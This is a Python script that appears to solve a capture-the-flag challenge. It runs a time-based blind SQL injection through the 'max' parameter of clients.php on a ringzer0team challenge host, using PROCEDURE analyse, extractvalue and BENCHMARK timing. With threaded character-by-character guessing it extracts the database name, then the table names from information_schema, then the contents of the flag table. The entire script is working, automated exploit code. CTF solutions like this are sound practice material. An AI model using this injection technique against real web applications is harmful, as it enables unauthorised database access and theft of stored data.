from concurrent.futures import ThreadPoolExecutor
import requests
from time import sleep, time
from matplotlib import pyplot as plt

TARGET = "http://challenges.ringzer0team.com:10189"

CHS = [i for i in range(0x20, 0x7f)]
CHS.remove(ord("'"))
CHS.remove(ord("\\"))

def clientphpmax_send(arg):

    res = requests.get(f"{TARGET}/clients.php?max={arg}")
    return res.status_code, res.content

def binsearch_maxint():

    lo = 10000000000000000000
    hi = 100000000000000000000

    while lo + 3 < hi:

        y = (lo + hi) // 2

        code, _ = clientphpmax_send(f"0,{y}")
        if code == 500:
            hi = y
        elif code == 200:
            lo = y
        else:
            print(f"status code {code} for y = {y}")
            return

        print(f"lo {lo}, hi {hi}")
        sleep(0.3)

    print(f"FINAL lo {lo}, hi {hi}")

def time_query(to_check):

    '''
    PROCEDURE analyse   -> a procedure to call
    extractvalue        -> for XPATH error based SQLi
    concat              -> obtain a string from condition from IF
    '''

    q = f"1,1 PROCEDURE analyse((SELECT extractvalue(rand(),concat(0x3a,(IF(({to_check}), BENCHMARK(8000000,SHA1(1)),1))))),1)"

    t = time()
    _, _ = clientphpmax_send(q)
    t = time() - t

    return t

def max_from_time_queries(ts):

    l = None,
    t = -1

    for l_, t_ in ts.items():
        if t_ > t:
            l = l_ 
            t = t_

    return l

def str_to_hexrep(s):

    hr = 0

    i = 0
    while i < len(s):

        hr += ord(s[i])
        hr <<= 8

        i += 1

    hr >>= 8
    hr = hex(hr)

    return hr

def db_name():

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        # length of database name
        
        ts = {i: None for i in range(40)}

        for l in ts.keys():
            ts[l] = threadpool.submit(time_query, f"SELECT LENGTH(database()) LIKE {l}")

        for l in ts.keys():
            ts[l] = ts[l].result()

        #plt.plot(ts.keys(), ts.values())
        #plt.show()

        l = max_from_time_queries(ts)

        print(f"length of db name: {l}")

        # database name

        name = []
        for i in range(l):

            ts = {c_ord: None for c_ord in CHS}

            for c_ord in ts.keys():
                ts[c_ord] = threadpool.submit(time_query, f"SELECT ORD(SUBSTRING(database(), {i + 1}, 1)) LIKE {c_ord}")

            for c_ord in ts.keys():
                ts[c_ord] = ts[c_ord].result()

            #plt.plot(ts.keys(), ts.values())
            #plt.show()

            name.append(chr(max_from_time_queries(ts)))

        dbname = ''.join(name)
        print(f'database name {dbname}')
        return dbname

def table_names(dbname):

    dbname_ = str_to_hexrep(dbname)

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        # number of tables in database
        # could only find a way to make it work by treating the number as string 

        table_cnt = ''

        # guess 2 - if too big (i.e. the second "digit" is most likely a random char), choose 1
        # and yes it was 1
        for i in range(1):
        
            ts = {c_ord: None for c_ord in CHS}

            for c_ord in ts.keys():
                ts[c_ord] = threadpool.submit(time_query, f"SELECT ORD(SUBSTRING((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema={dbname_}), {i + 1}, 1))={c_ord}")
            
            for c_ord in ts.keys():
                ts[c_ord] = ts[c_ord].result()

            #plt.plot(ts.keys(), ts.values())
            #plt.show() 

            table_cnt += f'{chr(max_from_time_queries(ts))}'

        table_cnt = int(table_cnt, 10)
        print(f"database {dbname} has {table_cnt} tables")

        # could not find the length of the name of each table in a simple way
        # so i just assumed a reasonable maximum length
        # and repeated multiple times.
        # with high probability, the index where the results start to differ from one round to another
        # indicates the end of the name for that table

        MAX_LEN = 10

        ROUND_CNT = 3
        tables =    {
                        i: 
                        {
                            t_idx: None
                            for t_idx in range(table_cnt)
                        } 
                        for i in range(ROUND_CNT)
                    }

        for r in range(ROUND_CNT):
            for t_idx in range(table_cnt):

                name = []
                for i in range(MAX_LEN):

                    ts = {c_ord: None for c_ord in CHS}
                    for c_ord in ts.keys():
                        ts[c_ord] = threadpool.submit(time_query, f"SELECT ORD(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema={dbname_} LIMIT {t_idx},1), {i + 1}, 1)) LIKE {c_ord}")

                    for c_ord in ts.keys():
                        ts[c_ord] = ts[c_ord].result()

                    name.append(chr(max_from_time_queries(ts)))

                tables[r][t_idx] = ''.join(name)

        for t_idx in range(table_cnt):
            
            idx_dif = len(tables[0][t_idx])

            for r in range(1, ROUND_CNT):
            
                idx_dif_ = 0
                while tables[0][t_idx][idx_dif_] == tables[r][t_idx][idx_dif_]:
                    idx_dif_ += 1
                
                if idx_dif_ < idx_dif:
                    idx_dif = idx_dif_

            tables[0][t_idx] = tables[0][t_idx][:idx_dif]
            print(f"found table {tables[0][t_idx]}")

        return [tables[0][t_idx] for t_idx in range(table_cnt)]

def read_flag_table(dbname, tablename):

    flag_table = f"{dbname}.{tablename}"

    with ThreadPoolExecutor(max_workers = 8) as threadpool:

        MAX_LEN = 60

        ROUND_CNT = 3
        flag = {r: [] for r in range(ROUND_CNT)}
        for r in range(ROUND_CNT):

            for i in range(MAX_LEN):

                ts = {c_ord: None for c_ord in CHS}
                for c_ord in ts.keys():
                    ts[c_ord] = threadpool.submit(time_query, f"SELECT ORD(SUBSTRING((SELECT * FROM {flag_table}), {i + 1}, 1)) LIKE {c_ord}")

                for c_ord in ts.keys():
                    ts[c_ord] = ts[c_ord].result()

                flag[r].append(chr(max_from_time_queries(ts)))

        print(flag)
            
        idx_dif = len(flag[0])

        for r in range(1, ROUND_CNT):
        
            idx_dif_ = 0
            while flag[0][idx_dif_] == flag[r][idx_dif_]:
                idx_dif_ += 1
            
            if idx_dif_ < idx_dif:
                idx_dif = idx_dif_

        flag = flag[0][:idx_dif]
        print(f"flag {flag}")

def start():

    #binsearch_maxint()

    #dbname = db_name()
    dbname = "sqli2"
    
    #tablenames = table_names(dbname)
    tablenames = ["contact", "flag"]

    read_flag_table(dbname, "flag")

if __name__ == "__main__":
    start()